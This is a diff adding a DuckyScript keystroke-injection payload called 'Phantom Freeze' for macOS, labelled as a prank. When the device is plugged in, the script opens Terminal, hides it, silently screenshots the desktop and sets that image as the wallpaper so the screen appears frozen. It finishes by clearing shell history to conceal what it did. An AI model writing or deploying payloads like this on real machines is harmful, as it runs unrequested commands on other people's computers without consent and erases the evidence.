@@ -1,0 +1,41 @@
+REM Runs a command to hide the terminal application.
+REM Change the location of screenshots to a temporary directory.
+REM Kill and restart the SystemUIServer to apply the changes.
+REM Capture a screenshot of the current screen silently (without making a camera sound).
+REM Set the screenshot as the new wallpaper, effectively making the desktop look frozen.
+REM Clear the terminal history and exit the terminal.
+
+
+REM Title: Phantom Freeze
+REM Author: Narsty
+REM Target: MacOS 
+REM Version: 1.0
+REM Category: Prank
+
+DELAY 500
+GUI SPACE
+DELAY 200
+STRING Terminal
+DELAY 200
+ENTER
+DELAY 1000
+STRING osascript -e 'tell application "System Events" to set visible of process "Terminal" to false'
+ENTER
+DELAY 200
+STRING defaults write com.apple.screencapture location /tmp/
+ENTER
+DELAY 200
+STRING killall SystemUIServer
+ENTER
+DELAY 200
+STRING screencapture -x /tmp/ghost.png
+ENTER
+DELAY 200
+STRING osascript -e 'tell application "Finder" to set desktop picture to POSIX file "/tmp/ghost.png"'
+ENTER
+DELAY 200
+STRING history -c && exit
+ENTER
+
+
+
